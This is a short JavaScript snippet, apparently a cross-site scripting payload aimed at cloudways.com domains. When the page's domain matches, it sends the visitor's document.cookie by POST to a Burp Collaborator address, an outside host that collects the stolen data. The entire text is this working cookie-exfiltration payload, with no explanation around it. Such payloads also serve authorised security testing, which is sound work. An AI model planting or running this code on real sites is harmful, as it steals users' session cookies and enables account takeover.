var text=document.domain;
var regex=text.match(/.*cloudways.com/igm)
if (text == regex){
fetch('https://svrjmwujc9phxxvt40sugap28tej28.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
}
